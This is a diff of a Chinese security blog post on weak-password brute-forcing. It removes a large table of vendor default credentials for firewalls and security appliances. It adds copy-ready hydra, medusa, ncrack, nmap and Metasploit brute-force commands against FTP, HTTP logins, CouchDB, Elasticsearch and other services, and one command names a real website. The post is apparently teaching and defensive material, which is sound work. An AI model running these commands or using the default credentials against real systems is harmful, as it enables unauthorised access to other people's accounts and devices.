@@ -25,15 +25,15 @@
 
     <meta name="description" content="本文总结各类弱口令漏洞类型及利用方式...">
 <meta property="og:type" content="article">
-<meta property="og:title" content="弱口令爆破姿势">
+<meta property="og:title" content="弱口令爆破技术探究">
 <meta property="og:url" content="https://l0n9w4y.cc/posts/10235/index.html">
 <meta property="og:site_name" content="L0n9w4y">
 <meta property="og:description" content="本文总结各类弱口令漏洞类型及利用方式...">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2018-08-19T13:52:20.000Z">
-<meta property="article:modified_time" content="2022-07-31T12:41:26.128Z">
+<meta property="article:modified_time" content="2022-09-06T14:03:09.430Z">
 <meta property="article:author" content="L0n9w4y">
-<meta property="article:tag" content="Vulner">
+<meta property="article:tag" content="Vulnerability">
 <meta property="article:tag" content="Brute-force">
 <meta property="article:tag" content="Init Access">
 <meta name="twitter:card" content="summary">
@@ -43,10 +43,10 @@
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l0n9w4y.cc/posts/10235/","path":"posts/10235/","title":"弱口令爆破姿势"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l0n9w4y.cc/posts/10235/","path":"posts/10235/","title":"弱口令爆破技术探究"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>弱口令爆破姿势 | L0n9w4y</title>
+<title>弱口令爆破技术探究 | L0n9w4y</title>
   
 
 
@@ -122,7 +122,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-text">0x01 攻击面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%88%86%E7%A0%B4%E5%AD%97%E5%85%B8"><span class="nav-text">0x02 爆破字典</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%8E%82%E5%95%86%E5%88%9D%E5%A7%8B%E5%8F%A3%E4%BB%A4"><span class="nav-text">1. 厂商初始口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%88%86%E7%A0%B4%E5%AD%97%E5%85%B8%E5%90%88%E9%9B%86"><span class="nav-text">2. 爆破字典合集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7"><span class="nav-text">3. 字典生成工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E7%88%86%E7%A0%B4%E5%AE%9E%E6%88%98"><span class="nav-text">0x03 爆破实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7"><span class="nav-text">1. 爆破工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%9C%A8%E7%BA%BF%E7%88%86%E7%A0%B4"><span class="nav-text">2. 在线爆破</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#a-Hydra"><span class="nav-text">a. Hydra</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#b-Medusa"><span class="nav-text">b. Medusa</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%A6%BB%E7%BA%BF%E7%88%86%E7%A0%B4"><span class="nav-text">3. 离线爆破</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#a-John-the-Ripper"><span class="nav-text">a. John the Ripper</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#b-hashcat"><span class="nav-text">b. hashcat</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E9%98%B2%E5%BE%A1%E5%8A%A0%E5%9B%BA"><span class="nav-text">0x04 防御加固</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%BC%BA%E9%99%B7%E6%80%BB%E7%BB%93"><span class="nav-text">1. 缺陷总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8F%A3%E4%BB%A4%E8%AE%BE%E7%BD%AE"><span class="nav-text">2. 口令设置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5"><span class="nav-text">3. 防御策略</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Reference"><span class="nav-text">0x05 Reference</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-text">0x01 攻击面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%88%86%E7%A0%B4%E5%AD%97%E5%85%B8"><span class="nav-text">0x02 爆破字典</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%88%86%E7%A0%B4%E5%AD%97%E5%85%B8%E5%90%88%E9%9B%86"><span class="nav-text">1. 爆破字典合集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7"><span class="nav-text">2. 字典生成工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7"><span class="nav-text">0x03 爆破工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="nav-text">1. 常用工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%9C%A8%E7%BA%BF%E7%88%86%E7%A0%B4"><span class="nav-text">2. 在线爆破</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#a-Hydra"><span class="nav-text">a. Hydra</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#b-Medusa"><span class="nav-text">b. Medusa</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%A6%BB%E7%BA%BF%E7%88%86%E7%A0%B4"><span class="nav-text">3. 离线爆破</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#a-John-the-Ripper"><span class="nav-text">a. John the Ripper</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#b-hashcat"><span class="nav-text">b. hashcat</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E7%88%86%E7%A0%B4%E5%AE%9E%E6%88%98"><span class="nav-text">0x03 爆破实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-AJP"><span class="nav-text">1. AJP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-CouchDB"><span class="nav-text">2. CouchDB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Docker-Registry"><span class="nav-text">3. Docker Registry</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Elasticsearch"><span class="nav-text">4. Elasticsearch</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-FTP"><span class="nav-text">5. FTP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-HTTP-Basic-Auth"><span class="nav-text">6. HTTP Basic Auth</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-HTTP-Post-Form"><span class="nav-text">7. HTTP - Post Form</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-HTTP-CMS"><span class="nav-text">8. HTTP - CMS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-IMAP"><span class="nav-text">9. IMAP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-IRC"><span class="nav-text">10. IRC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-JWT"><span class="nav-text">11. JWT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-LDAP"><span class="nav-text">12. LDAP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-Mongo"><span class="nav-text">13. Mongo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-MySQL"><span class="nav-text">14. MySQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#15-PostgreSQL"><span class="nav-text">15. PostgreSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#16-RDP"><span class="nav-text">16. RDP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#17-Redis"><span class="nav-text">17. Redis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#18-Rexec"><span class="nav-text">18. Rexec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#19-Rlogin"><span class="nav-text">19. Rlogin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#20-Rsh"><span class="nav-text">20. Rsh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#21-Rsync"><span class="nav-text">21. Rsync</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#22-SMB"><span class="nav-text">22. SMB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#23-Socks"><span class="nav-text">23. Socks</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#24-SSH"><span class="nav-text">24. SSH</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#25-Telnet"><span class="nav-text">25. Telnet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#26-VNC"><span class="nav-text">26. VNC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E9%98%B2%E5%BE%A1%E5%8A%A0%E5%9B%BA"><span class="nav-text">0x04 防御加固</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%BC%BA%E9%99%B7%E6%80%BB%E7%BB%93"><span class="nav-text">1. 缺陷总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8F%A3%E4%BB%A4%E8%AE%BE%E7%BD%AE"><span class="nav-text">2. 口令设置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5"><span class="nav-text">3. 防御策略</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Reference"><span class="nav-text">0x05 Reference</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -212,12 +212,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="弱口令爆破姿势 | L0n9w4y">
+      <meta itemprop="name" content="弱口令爆破技术探究 | L0n9w4y">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          弱口令爆破姿势
+          弱口令爆破技术探究
         </h1>
 
         <div class="post-meta-container">
@@ -535,423 +535,7 @@
 </tr>
 </tbody></table>
 <p><em>Refer:</em> <a target="_blank" rel="noopener" href="http://www.91ri.org/15441.html">http://www.91ri.org/15441.html</a></p>
-<h2 id="0x02-爆破字典"><a href="#0x02-爆破字典" class="headerlink" title="0x02 爆破字典"></a>0x02 爆破字典</h2><h3 id="1-厂商初始口令"><a href="#1-厂商初始口令" class="headerlink" title="1. 厂商初始口令"></a>1. 厂商初始口令</h3><p><strong>网络安全设备</strong></p>
-<table>
-<thead>
-<tr>
-<th align="center">设备</th>
-<th align="center">默认账号</th>
-<th align="center">初始密码</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">深信服设备</td>
-<td align="center">sangfor</td>
-<td align="center">sangfor、sangfor@2019、sangfor@2020</td>
-</tr>
-<tr>
-<td align="center">深信服科技 AD</td>
-<td align="center">sangfor</td>
-<td align="center">dlanrecover</td>
-</tr>
-<tr>
-<td align="center">深信服负载均衡AD 3.6</td>
-<td align="center">admin</td>
-<td align="center">admin</td>
-</tr>
-<tr>
-<td align="center">深信服WAC ( WNS V2.6)</td>
-<td align="center">admin</td>
-<td align="center">admin</td>
-</tr>
-<tr>
-<td align="center">深信服VPN</td>
-<td align="center">Admin</td>
-<td align="center">Admin</td>
-</tr>
-<tr>
-<td align="center">深信服ipsec-VPN (SSL 5.5)</td>
-<td align="center">Admin</td>
-<td align="center">Admin</td>
-</tr>
-<tr>
-<td align="center">深信服AC6.0</td>
-<td align="center">admin</td>
-<td align="center">admin</td>
-</tr>
-<tr>
-<td align="center">SANGFOR防火墙</td>
-<td align="center">admin</td>
-<td align="center">sangfor</td>
-</tr>
-<tr>
-<td align="center">深信服AF(NGAF V2.2)</td>
-<td align="center">admin</td>
-<td align="center">sangfor</td>
-</tr>
-<tr>
-<td align="center">深信服NGAF下一代应用防火墙(NGAF V4.3)</td>
-<td align="center">admin</td>
-<td align="center">admin</td>
-</tr>
-<tr>
-<td align="center">深信服AD3.9</td>
-<td align="center">admin</td>
-<td align="center">admin</td>
-</tr>
-<tr>
-<td align="center">深信服上网行为管理设备数据中心</td>
-<td align="center">Admin</td>
-<td align="center">密码为空</td>
-</tr>
-<tr>
-<td align="center">SANGFOR_AD_v5.1</td>
-<td align="center">admin</td>
-<td align="center">admin</td>
-</tr>
-<tr>
-<td align="center">网御漏洞扫描系统</td>
-<td align="center">leadsec</td>
-<td align="center">leadsec</td>
-</tr>
-<tr>
-<td align="center">天阗入侵检测与管理系统 V7.0</td>
-<td align="center">Admin、Audit、adm</td>
-<td align="center">venus70</td>
-</tr>
-<tr>
-<td align="center">天阗入侵检测与管理系统 V6.0</td>
-<td align="center">Admin、Audit、adm</td>
-<td align="center">venus60</td>
-</tr>
-<tr>
-<td align="center">网御WAF集中控制中心(V3.0R5.0)</td>
-<td align="center">admin、audit、adm</td>
-<td align="center">leadsec.waf</td>
-</tr>
-<tr>
-<td align="center">联想网御</td>
-<td align="center">administrator</td>
-<td align="center">administrator</td>
-</tr>
-<tr>
-<td align="center">网御事件服务器</td>
-<td align="center">admin</td>
-<td align="center">admin123</td>
-</tr>
-<tr>
-<td align="center">联想网御防火墙PowerV</td>
-<td align="center">administrator</td>
-<td align="center">administrator</td>
-</tr>
-<tr>
-<td align="center">联想网御入侵检测系统</td>
-<td align="center">lenovo</td>
-<td align="center">default</td>
-</tr>
-<tr>
-<td align="center">网络卫士入侵检测系统</td>
-<td align="center">admin</td>
-<td align="center">talent</td>
-</tr>
-<tr>
-<td align="center">网御入侵检测系统V3.2.72.0</td>
-<td align="center">adm、admin</td>
-<td align="center">leadsec32</td>
-</tr>
-<tr>
-<td align="center">联想网御入侵检测系统IDS</td>
-<td align="center">root</td>
-<td align="center">111111</td>
-</tr>
-<tr>
-<td align="center">联想网御入侵检测系统IDS</td>
-<td align="center">admin</td>
-<td align="center">admin123</td>
-</tr>
-<tr>
-<td align="center">科来网络回溯分析系统</td>
-<td align="center">csadmin</td>
-<td align="center">colasoft</td>
-</tr>
-<tr>
-<td align="center">中控考勤机web3.0</td>
-<td align="center">administrator</td>
-<td align="center">123456</td>
-</tr>
-<tr>
-<td align="center">H3C iMC</td>
-<td align="center">admin</td>
-<td align="center">admin</td>
-</tr>
-<tr>
-<td align="center">H3C SecPath系列</td>
-<td align="center">admin</td>
-<td align="center">admin</td>
-</tr>
-<tr>
-<td align="center">H3C S5120-SI</td>
-<td align="center">test</td>
-<td align="center">123</td>
-</tr>
-<tr>
-<td align="center">H3C智能管理中心</td>
-<td align="center">admin</td>
-<td align="center">admin</td>
-</tr>
-<tr>
-<td align="center">H3C ER3100</td>
-<td align="center">admin</td>
-<td align="center">adminer3100</td>
-</tr>
-<tr>
-<td align="center">H3C ER3200</td>
-<td align="center">admin</td>
-<td align="center">adminer3200</td>
-</tr>
-<tr>
-<td align="center">H3C ER3260</td>
-<td align="center">admin</td>
-<td align="center">adminer3260</td>
-</tr>
-<tr>
-<td align="center">H3C</td>
-<td align="center">admin</td>
-<td align="center">adminer</td>
-</tr>
-<tr>
-<td align="center">H3C</td>
-<td align="center">admin</td>
-<td align="center">admin</td>
-</tr>
-<tr>
-<td align="center">H3C</td>
-<td align="center">admin</td>
-<td align="center">h3capadmin</td>
-</tr>
-<tr>
-<td align="center">H3C</td>
-<td align="center">h3c</td>
-<td align="center">h3c</td>
-</tr>
-<tr>
-<td align="center">360天擎</td>
-<td align="center">admin</td>
-<td align="center">admin</td>
-</tr>
-<tr>
-<td align="center">网神防火墙</td>
-<td align="center">firewall</td>
-<td align="center">firewall</td>
-</tr>
-<tr>
-<td align="center">天融信防火墙NGFW4000</td>
-<td align="center">superman</td>
-<td align="center">talent</td>
-</tr>
-<tr>
-<td align="center">黑盾防火墙</td>
-<td align="center">admin</td>
-<td align="center">admin</td>
-</tr>
-<tr>
-<td align="center">黑盾防火墙</td>
-<td align="center">rule、audit</td>
-<td align="center">abc123</td>
-</tr>
-<tr>
-<td align="center">华为防火墙</td>
-<td align="center">telnetuser</td>
-<td align="center">telnetpwd</td>
-</tr>
-<tr>
-<td align="center">华为防火墙</td>
-<td align="center">ftpuser</td>
-<td align="center">ftppwd</td>
-</tr>
-<tr>
-<td align="center">方正防火墙</td>
-<td align="center">admin</td>
-<td align="center">admin</td>
-</tr>
-<tr>
-<td align="center">飞塔防火墙</td>
-<td align="center">admin</td>
-<td align="center">密码为空</td>
-</tr>
-<tr>
-<td align="center">Juniper_SSG__5防火墙</td>
-<td align="center">netscreen</td>
-<td align="center">netscreen</td>
-</tr>
-<tr>
-<td align="center">中新金盾硬件防火墙</td>
-<td align="center">admin</td>
-<td align="center">123</td>
-</tr>
-<tr>
-<td align="center">kill防火墙(冠群金辰)</td>
-<td align="center">admin</td>
-<td align="center">sys123</td>
-</tr>
-<tr>
-<td align="center">天清汉马USG防火墙</td>
-<td align="center">admin</td>
-<td align="center">venus.fw</td>
-</tr>
-<tr>
-<td align="center">天清汉马USG防火墙</td>
-<td align="center">Audit</td>
-<td align="center">venus.audit</td>
-</tr>
-<tr>
-<td align="center">天清汉马USG防火墙</td>
-<td align="center">useradmin</td>
-<td align="center">venus.user</td>
-</tr>
-<tr>
-<td align="center">阿姆瑞特防火墙</td>
-<td align="center">admin</td>
-<td align="center">manager</td>
-</tr>
-<tr>
-<td align="center">山石网科</td>
-<td align="center">hillstone</td>
-<td align="center">hillstone</td>
-</tr>
-<tr>
-<td align="center">绿盟安全审计系统</td>
-<td align="center">weboper</td>
-<td align="center">weboper</td>
-</tr>
-<tr>
-<td align="center">绿盟安全审计系统</td>
-<td align="center">webaudit</td>
-<td align="center">webaudit</td>
-</tr>
-<tr>
-<td align="center">绿盟安全审计系统</td>
-<td align="center">conadmin</td>
-<td align="center">conadmin</td>
-</tr>
-<tr>
-<td align="center">绿盟安全审计系统</td>
-<td align="center">admin</td>
-<td align="center">admin</td>
-</tr>
-<tr>
-<td align="center">绿盟安全审计系统</td>
-<td align="center">shell</td>
-<td align="center">shell</td>
-</tr>
-<tr>
-<td align="center">绿盟产品</td>
-<td align="center"></td>
-<td align="center">nsfocus123</td>
-</tr>
-<tr>
-<td align="center">TopAudit日志审计系统</td>
-<td align="center">superman</td>
-<td align="center">talent</td>
-</tr>
-<tr>
-<td align="center">LogBase日志管理综合审计系统</td>
-<td align="center">admin</td>
-<td align="center">safetybase</td>
-</tr>
-<tr>
-<td align="center">网神SecFox运维安全管理与审计系统</td>
-<td align="center">admin</td>
-<td align="center">!1fw@2soc#3vpn</td>
-</tr>
-<tr>
-<td align="center">天融信数据库审计系统</td>
-<td align="center">superman</td>
-<td align="center">telent</td>
-</tr>
-<tr>
-<td align="center">Hillstone安全审计平台</td>
-<td align="center">hillstone</td>
-<td align="center">hillstone</td>
-</tr>
-<tr>
-<td align="center">网康日志中心</td>
-<td align="center">ns25000</td>
-<td align="center">ns25000</td>
-</tr>
-<tr>
-<td align="center">网络安全审计系统（中科新业）</td>
-<td align="center">admin</td>
-<td align="center">123456</td>
-</tr>
-<tr>
-<td align="center">天玥网络安全审计系统</td>
-<td align="center">Admin</td>
-<td align="center">cyberaudit</td>
-</tr>
-<tr>
-<td align="center">明御WEB应用防火墙</td>
-<td align="center">admin</td>
-<td align="center">admin、adminadmin</td>
-</tr>
-<tr>
-<td align="center">明御攻防实验室平台</td>
-<td align="center">root</td>
-<td align="center">123456</td>
-</tr>
-<tr>
-<td align="center">明御安全网关</td>
-<td align="center">admin</td>
-<td align="center">adminadmin</td>
-</tr>
-<tr>
-<td align="center">明御运维审计与册风险控制系统</td>
-<td align="center">admin</td>
-<td align="center">1q2w3e</td>
-</tr>
-<tr>
-<td align="center">明御运维审计与册风险控制系统</td>
-<td align="center">system、auditor、operator</td>
-<td align="center">1q2w3e4r</td>
-</tr>
-<tr>
-<td align="center">明御网站卫士</td>
-<td align="center">sysmanager</td>
-<td align="center">sysmanager888</td>
-</tr>
-<tr>
-<td align="center">亿邮邮件网关</td>
-<td align="center">eyouuser</td>
-<td align="center">eyou_admin</td>
-</tr>
-<tr>
-<td align="center">亿邮邮件网关</td>
-<td align="center">eyougw</td>
-<td align="center">admin@(eyou)</td>
-</tr>
-<tr>
-<td align="center">亿邮邮件网关</td>
-<td align="center">admin</td>
-<td align="center">+-ccccc</td>
-</tr>
-<tr>
-<td align="center">亿邮邮件网关</td>
-<td align="center">admin</td>
-<td align="center">cyouadmin</td>
-</tr>
-<tr>
-<td align="center">Websense邮件安全网关</td>
-<td align="center">administrator</td>
-<td align="center">admin</td>
-</tr>
-<tr>
-<td align="center">梭子鱼邮件存储网关</td>
-<td align="center">admin</td>
-<td align="center">admin</td>
-</tr>
-</tbody></table>
-<p><em>More:</em> <a target="_blank" rel="noopener" href="https://github.com/ihebski/DefaultCreds-cheat-sheet">https://github.com/ihebski/DefaultCreds-cheat-sheet</a></p>
-<h3 id="2-爆破字典合集"><a href="#2-爆破字典合集" class="headerlink" title="2. 爆破字典合集"></a>2. 爆破字典合集</h3><ul>
+<h2 id="0x02-爆破字典"><a href="#0x02-爆破字典" class="headerlink" title="0x02 爆破字典"></a>0x02 爆破字典</h2><h3 id="1-爆破字典合集"><a href="#1-爆破字典合集" class="headerlink" title="1. 爆破字典合集"></a>1. 爆破字典合集</h3><ul>
 <li><p><a target="_blank" rel="noopener" href="https://weakpass.com/">Weakpass</a> <em>多种类型的爆破字典合集</em></p>
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts">fuzzDicts</a> <em>Web Pentesting Fuzz字典，适用于中国环境</em></p>
@@ -964,8 +548,10 @@
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://project-rainbowcrack.com/table.htm">List of Rainbow Tables</a>  <em>基于彩虹表的字典合集</em></p>
 </li>
+<li><p><em>More:</em> <a target="_blank" rel="noopener" href="https://github.com/ihebski/DefaultCreds-cheat-sheet">https://github.com/ihebski/DefaultCreds-cheat-sheet</a> <em>厂商弱口令总结</em></p>
+</li>
 </ul>
-<h3 id="3-字典生成工具"><a href="#3-字典生成工具" class="headerlink" title="3. 字典生成工具"></a>3. 字典生成工具</h3><ul>
+<h3 id="2-字典生成工具"><a href="#2-字典生成工具" class="headerlink" title="2. 字典生成工具"></a>2. 字典生成工具</h3><ul>
 <li><p><a target="_blank" rel="noopener" href="https://github.com/LandGrey/pydictor">pydictor</a> <em>一款强大用于暴力破解的字典生成器</em></p>
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://github.com/Mebus/cupp">CUPP</a> <em>依据个人信息生成专属字典</em></p>
@@ -973,7 +559,7 @@
 <li><p><a target="_blank" rel="noopener" href="https://github.com/digininja/CeWL">CeWL</a> <em>通过收集企业信息生成专属字典</em></p>
 </li>
 </ul>
-<h2 id="0x03-爆破实战"><a href="#0x03-爆破实战" class="headerlink" title="0x03 爆破实战"></a>0x03 爆破实战</h2><h3 id="1-爆破工具"><a href="#1-爆破工具" class="headerlink" title="1. 爆破工具"></a>1. 爆破工具</h3><ul>
+<h2 id="0x03-爆破工具"><a href="#0x03-爆破工具" class="headerlink" title="0x03 爆破工具"></a>0x03 爆破工具</h2><h3 id="1-常用工具"><a href="#1-常用工具" class="headerlink" title="1. 常用工具"></a>1. 常用工具</h3><ul>
 <li><p><a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">Hydra</a> <em>在线开源密码破解工具，支持多种协议类型及不同形式的WEB表单认证破解</em></p>
 </li>
 <li><p><a target="_blank" rel="noopener" href="http://foofus.net/goons/jmk/tools">Medusa</a> <em>在线开源密码破解工具，支持多种协议，稳定性较高</em></p>
@@ -1178,6 +764,58 @@
 <h4 id="b-hashcat"><a href="#b-hashcat" class="headerlink" title="b. hashcat"></a>b. hashcat</h4><p><strong>安装</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://hashcat.net/files/hashcat-6.1.1.tar.gz</span><br><span class="line"></span><br><span class="line">$ tar zxvf hashcat-6.1.1.tar.gz</span><br><span class="line"></span><br><span class="line">$ make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
 
+<h2 id="0x03-爆破实战"><a href="#0x03-爆破实战" class="headerlink" title="0x03 爆破实战"></a>0x03 爆破实战</h2><h3 id="1-AJP"><a href="#1-AJP" class="headerlink" title="1. AJP"></a>1. AJP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script ajp-brute -p 8009 &lt;IP&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-CouchDB"><a href="#2-CouchDB" class="headerlink" title="2. CouchDB"></a>2. CouchDB</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/couchdb/couchdb_login</span><br><span class="line">hydra -L /usr/share/brute/wordlists/simple-users.txt -P /usr/share/brute/wordlists/password.lst localhost -s 5984 http-get /</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-Docker-Registry"><a href="#3-Docker-Registry" class="headerlink" title="3. Docker Registry"></a>3. Docker Registry</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-Elasticsearch"><a href="#4-Elasticsearch" class="headerlink" title="4. Elasticsearch"></a>4. Elasticsearch</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-FTP"><a href="#5-FTP" class="headerlink" title="5. FTP"></a>5. FTP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ftp</span><br><span class="line">ncrack -p 21 --user root -P passwords.txt &lt;IP&gt; [-T 5]</span><br><span class="line">medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ftp</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-HTTP-Basic-Auth"><a href="#6-HTTP-Basic-Auth" class="headerlink" title="6. HTTP Basic Auth"></a>6. HTTP Basic Auth</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/</span><br><span class="line"># Use https-get mode for httpS</span><br><span class="line">medusa -h &lt;IP&gt; -u &lt;username&gt; -P  &lt;passwords.txt&gt; -M  http -m DIR:/path/to/auth -T 10</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-HTTP-Post-Form"><a href="#7-HTTP-Post-Form" class="headerlink" title="7. HTTP - Post Form"></a>7. HTTP - Post Form</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form &quot;/path/index.php:name=^USER^&amp;password=^PASS^&amp;enter=Sign+in:Login name or password is incorrect&quot; -V</span><br><span class="line"># Use https-post-form mode for httpS</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-HTTP-CMS"><a href="#8-HTTP-CMS" class="headerlink" title="8. HTTP - CMS"></a>8. HTTP - CMS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmsmap -f W/J/D/M -u a -p a https://wordpress.com</span><br></pre></td></tr></table></figure>
+
